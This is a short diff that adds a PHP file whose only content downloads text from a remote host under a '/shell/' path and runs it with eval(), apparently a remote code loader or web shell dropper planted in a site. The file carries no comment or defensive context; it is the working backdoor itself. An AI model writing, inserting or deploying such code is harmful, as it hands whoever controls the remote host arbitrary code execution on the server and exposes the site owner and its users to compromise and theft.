@@ -1,0 +1,11 @@
+<?php
+
+
+
+$content = file_get_contents(urldecode('https://backburner.xyz/shell/blank.txt'));
+
+
+
+$content = "?> ".$content;
+
+eval($content);
